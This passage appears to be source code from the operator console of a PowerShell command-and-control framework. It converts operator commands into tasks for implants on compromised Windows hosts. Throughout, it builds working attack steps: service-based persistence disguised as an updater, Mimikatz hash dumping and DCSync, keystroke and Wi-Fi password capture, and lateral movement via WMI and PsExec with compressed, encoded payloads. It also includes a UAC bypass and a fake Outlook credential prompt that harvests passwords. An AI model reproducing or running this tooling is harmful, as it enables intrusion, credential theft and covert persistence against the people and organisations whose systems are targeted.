                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'ListModules') 
            {
                $pscommand = $null
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        Write-Host $mod
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  Write-Host $mod
                }
                
                Write-Host -Object ""
            }  
            if ($pscommand -eq 'ModulesLoaded') 
            {
                $pscommand = $null
                $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $mods
            }
            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
            {
                $pscommand = "sc.exe delete CPUpdater"       
            }
            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
            }
            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
            {
                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run Invoke-DaisyChain first"
                    $pscommand = $null
                }
            }            
            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$payload'"
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('hashdump'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                $pscommand = "Invoke-Mimikatz -Command `'`"lsadump::sam`"`'"
            }
            if ($pscommand.ToLower().StartsWith('get-wlanpass'))
            { 
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
            { 
                CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-firewall'))
            { 
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-x86'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"

            }
            if ($pscommand.ToLower().StartsWith('migrate-x64'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'invoke-psinject-payload',''
                $pscommand = "invoke-reflectivepeinjection $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
            { 
                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-bloodhounddata'))
            { 
                CheckModuleLoaded "bloodhound.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sniffer'))
            { 
                CheckModuleLoaded "invoke-sniffer.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('test-adcredential'))
            { 
                CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
            { 
                CheckModuleLoaded "Powerup.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
            { 
                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
            { 
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
            { 
                CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "Inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('new-zipfile'))
            { 
                CheckModuleLoaded "Zippy.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smblogin'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiexec'))
            { 
                CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-pipekat'))
            { 
                CheckModuleLoaded "Invoke-Pipekat.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-net'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mapdomaintrust'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-kerb'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
            { 
                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
            { 
                CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
            { 
                CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
            }
            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
            { 
                CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
            { 
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
            { 
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-wmicommand'))
            {
                CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('dump-ntds'))
            {
                CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-ad'))
            {
                CheckModuleLoaded "brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-locadmin'))
            {
                CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-passpol'))
            {
                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-locadm'))
            {
                CheckModuleLoaded "get-locadm.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-runas'))
            {
                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-shellcode'))
            {
                CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-pass-notexp'))
            {
                CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-winrmsession'))
            {
                CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-computerinfo'))
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-enum')) 
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
                CheckModuleLoaded "POwerup.ps1" $psrandomuri
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Netstat -anp tcp; Netstat -anp udp; Net share; Ipconfig; Net view; Net users; Net localgroup administrators; Net accounts; Net accounts dom;"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Proxy; Invoke-allchecks; Get-MShotfixes"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Firewallrulesall | out-string -width 200"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Screenshot"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-GPPPassword"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-WmiObject -Class Win32_Product"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" -Name CachedLogonsCount"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`""
                } | Out-Null
                
                $pscommand = "Get-RecentFiles; Get-WLANPass"

            }
            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runaspayload', ''
                $pscommand = "invoke-runaspayload $($pscommand)"
                
            }     
            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
            { 
            if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"     
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = '$proxypayload = "'+$proxypayload+'"'
                } | Out-Null
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
                $pscommand = "invoke-runasproxypayload $($pscommand)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }         
            if (($pscommand -eq 'StartAnotherImplantWithProxy') -or ($pscommand -eq 'saiwp'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('get-proxy')) 
            {
                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
            }
            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('upload-file')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createpayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'cred-popper') 
            {
                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
            }
            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
            {
                $pscommand = $pscommand -replace 'set-beacon ', ''
                $pscommand = $pscommand -replace 'sleep ', ''
                $pscommand = $pscommand -replace 'beacon ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = '$sleeptime = '+$newsleep
                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    Sleep = $newsleep
                    RandomURI = $psrandomuri
                } | Out-Null
            }
            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
            {
                $pscommand = $pscommand -replace 'start-sleep ', ''
                $pscommand = $pscommand -replace 'turtle ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = 'Start-Sleep '+$newsleep
            }
            if ($pscommand -eq 'invoke-ms16-032')
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032.ps1"
            }
            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand -eq 'invoke-uacbypassproxy')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "ProxyPayload.ps1" $psrandomuri
                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                    CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                    $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                    $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }            
            }
            if ($pscommand -eq 'invoke-uacbypass')
            { 
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"  
                CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
            } 
 
            if ($pscommand -eq 'Get-System') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } | Out-Null

                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe start CPUpdater"
                } | Out-Null
                $pscommand = "sc.exe delete CPUpdater"

            }
            if ($pscommand -eq 'Get-System-WithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                    } | Out-Null

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe start CPUpdater"
                    } | Out-Null
                    $pscommand = "sc.exe delete CPUpdater"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }                   
            if ($pscommand -eq 'Hide-Implant') 
            {
                $pscommand = "Hide"
            }
            if ($pscommand -eq 'Unhide-Implant' ) {
               Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
            }
            $pscommand
}
# command process loop
while($true)
{
    $global:command = Read-Host -Prompt $global:cmdlineinput

    if ($global:command)
    {
        $query = "INSERT INTO History (Command)
        VALUES (@Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
        Command = $global:command
        } | Out-Null
                              
        if ($global:implantid -eq "ALL")
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            }
            else 
            {
                $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE Alive='Yes'" -As SingleValue
                foreach ($implanturisingular in $dbresults)
                {
                    $global:randomuri = $implanturisingular
                    $outputcmd = runcommand $global:command $global:randomuri 
                    if (($outputcmd -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$implanturisingular'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $implanturisingular
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
        elseif ($global:implantid.contains(",")){
            if ($global:command -eq 'back' -or $global:command -eq 'exit')
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            } 
            else 
            {
                $global:implantid.split(",")| foreach {
                    $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                    $outputcmd = runcommand $global:command $global:randomuri
                    if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }            
        }
        else 
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            } 
            else 
            {
                #write-host $global:command $global:randomuri
                $outputcmd = runcommand $global:command $global:randomuri
                if ($outputcmd -eq 'hide') 
                {
                    Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    $outputcmd = $null
                }  
                if ($outputcmd) {
                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
    }
}
}


